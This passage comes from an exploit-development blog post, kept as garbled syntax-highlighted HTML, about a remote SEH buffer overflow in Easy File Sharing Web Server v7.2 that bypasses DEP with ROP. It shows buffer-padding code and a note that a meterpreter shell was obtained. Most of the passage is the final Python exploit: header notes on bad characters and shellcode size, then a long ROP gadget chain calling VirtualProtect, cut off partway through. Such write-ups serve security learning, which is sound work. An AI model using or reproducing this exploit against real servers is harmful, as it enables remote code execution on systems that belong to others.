</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">eax_offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>      <span class="c"># padding</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">I</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="mh">0xffffffff</span><span class="p">)</span>         <span class="c"># overwrite EAX to always trigger an exception</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">max_size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>        <span class="c"># padding&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>If everything went fine, we should get the meterpreter shell. Set the listener up and run the exploit.</p>

<p><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/meterpreter.png" alt="meterpreter PNG" /></p>

<p>Whoop-whoop! Obligatory victory-dance (cc: <a href="https://twitter.com/TheColonial">OJ</a>) :)</p>

<p><img src="/images/posts/2015-11-25-easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/shell_dance.gif" alt="shell_dance GIF" /></p>

<h2>Summary</h2>

<p>The final exploit with a simple PoC shellcode spawning a calculator is shown below.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">env</span> <span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c">#&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Exploit</span> <span class="n">title</span><span class="p">:</span> <span class="n">Easy</span> <span class="n">File</span> <span class="n">Sharing</span> <span class="n">Web</span> <span class="n">Server</span> <span class="n">v7</span><span class="o">.</span><span class="mi">2</span> <span class="o">-</span> <span class="n">Remote</span> <span class="n">SEH</span> <span class="n">Buffer</span> <span class="n">Overflow</span> <span class="p">(</span><span class="n">DEP</span> <span class="n">bypass</span> <span class="k">with</span> <span class="n">ROP</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Date</span><span class="p">:</span> <span class="mi">29</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2015</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Exploit</span> <span class="n">Author</span><span class="p">:</span> <span class="n">Knaps</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Contact</span><span class="p">:</span> <span class="nd">@TheKnapsy</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Website</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;http://blog.knapsy.com&quot;</span><span class="o">&gt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">blog</span><span class="o">.</span><span class="n">knapsy</span><span class="o">.</span><span class="n">com</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Software</span> <span class="n">Link</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;http://www.sharing-file.com/efssetup.exe&quot;</span><span class="o">&gt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">sharing</span><span class="o">-</span><span class="nb">file</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">efssetup</span><span class="o">.</span><span class="n">exe</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Version</span><span class="p">:</span> <span class="n">Easy</span> <span class="n">File</span> <span class="n">Sharing</span> <span class="n">Web</span> <span class="n">Server</span> <span class="n">v7</span><span class="o">.</span><span class="mi">2</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Tested</span> <span class="n">on</span><span class="p">:</span> <span class="n">Windows</span> <span class="mi">7</span> <span class="n">x64</span><span class="p">,</span> <span class="n">but</span> <span class="n">should</span> <span class="n">work</span> <span class="n">on</span> <span class="nb">any</span> <span class="n">other</span> <span class="n">Windows</span> <span class="n">platform</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c">#&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Notes</span><span class="p">:</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;-</span> <span class="n">based</span> <span class="n">on</span> <span class="n">non</span><span class="o">-</span><span class="n">DEP</span> <span class="n">SEH</span> <span class="nb">buffer</span> <span class="n">overflow</span> <span class="n">exploit</span> <span class="n">by</span> <span class="n">Audit0r</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;https://www.exploit-db.com/exploits/38526/&quot;</span><span class="o">&gt;</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">exploit</span><span class="o">-</span><span class="n">db</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">exploits</span><span class="o">/</span><span class="mi">38526</span><span class="o">/&lt;/</span><span class="n">a</span><span class="o">&gt;</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;-</span> <span class="n">created</span> <span class="k">for</span> <span class="n">fun</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">practice</span><span class="p">,</span> <span class="n">also</span> <span class="n">because</span> <span class="n">it</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">s</span> <span class="ow">not</span> <span class="mi">1998</span> <span class="n">anymore</span> <span class="o">-</span> <span class="n">gotta</span> <span class="n">bypass</span> <span class="n">that</span> <span class="n">DEP</span><span class="err">!</span> <span class="p">:)</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;-</span> <span class="n">bad</span> <span class="n">chars</span><span class="p">:</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="ow">and</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">x3b</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;-</span> <span class="nb">max</span> <span class="n">shellcode</span> <span class="n">size</span> <span class="n">allowed</span><span class="p">:</span> <span class="mi">1260</span> <span class="nb">bytes</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c">#&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">struct</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">ROP</span> <span class="n">chain</span> <span class="n">generated</span> <span class="k">with</span> <span class="n">mona</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span> <span class="n">www</span><span class="o">.</span><span class="n">corelan</span><span class="o">.</span><span class="n">be</span> <span class="p">(</span><span class="ow">and</span> <span class="n">slightly</span> <span class="n">fixed</span> <span class="n">by</span> <span class="nd">@TheKnapsy</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Essentially</span><span class="p">,</span> <span class="n">use</span> <span class="n">PUSHAD</span> <span class="n">to</span> <span class="nb">set</span> <span class="nb">all</span> <span class="n">parameters</span> <span class="ow">and</span> <span class="n">call</span> <span class="n">VirtualProtect</span><span class="p">()</span> <span class="n">to</span> <span class="n">disable</span> <span class="n">DEP</span><span class="o">.&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">create_rop_chain</span><span class="p">():</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="n">rop_gadgets</span> <span class="o">=</span> <span class="p">[</span>
</span><span class='line'>  <span class="c"># Generate value of 201 in EAX</span>
</span><span class='line'>  <span class="mh">0x10015442</span><span class="p">,</span>  <span class="c"># POP EAX # RETN [ImageLoad.dll]</span>
</span><span class='line'>  <span class="mh">0xFFFFFDFF</span><span class="p">,</span>  <span class="c"># Value of &#39;-201&#39;</span>
</span><span class='line'>  <span class="mh">0x100231d1</span><span class="p">,</span>  <span class="c"># NEG EAX # RETN [ImageLoad.dll]</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># Put EAX into EBX (other unneccessary stuff comes with this gadget as well...)</span>
</span><span class='line'>  <span class="mh">0x1001da09</span><span class="p">,</span>  <span class="c"># ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># Carry on with the ROP as generated by mona.py</span>
</span><span class='line'>  <span class="mh">0x10015442</span><span class="p">,</span>  <span class="c"># POP EAX # RETN [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x61c832d0</span><span class="p">,</span>  <span class="c"># ptr to &amp;amp;VirtualProtect() [IAT sqlite3.dll]</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># Compensate for the ADD EBX,EAX gadget above, jump over 1 address, which is a dummy writeable location</span>
</span><span class='line'>  <span class="c"># used solely by the remaining part of the above gadget (it doesn&#39;t really do anything for us)</span>
</span><span class='line'>  <span class="mh">0x1001281a</span><span class="p">,</span>  <span class="c"># ADD ESP,4 # RETN [ImageLoad.dll]</span>
</span><span class='line'>  <span class="mh">0x61c73281</span><span class="p">,</span>  <span class="c"># &amp;amp;Writable location [sqlite3.dll]</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># And carry on further as generated by mona.py</span>
</span><span class='line'>  <span class="mh">0x1002248c</span><span class="p">,</span>  <span class="c"># MOV EAX,DWORD PTR DS:[EAX] # RETN [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x61c18d81</span><span class="p">,</span>  <span class="c"># XCHG EAX,EDI # RETN [sqlite3.dll]</span>
</span><span class='line'>  <span class="mh">0x1001d626</span><span class="p">,</span>  <span class="c"># XOR ESI,ESI # RETN [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x10021a3e</span><span class="p">,</span>  <span class="c"># ADD ESI,EDI # RETN 0x00 [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x10013ad6</span><span class="p">,</span>  <span class="c"># POP EBP # RETN [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x61c227fa</span><span class="p">,</span>  <span class="c"># &amp;amp; push esp # ret  [sqlite3.dll]</span>
</span><span class='line'>  <span class="mh">0x10022c4c</span><span class="p">,</span>  <span class="c"># XOR EDX,EDX # RETN [ImageLoad.dll] </span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># Now bunch of ugly increments... unfortunately couldn&#39;t find anything nicer :(</span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
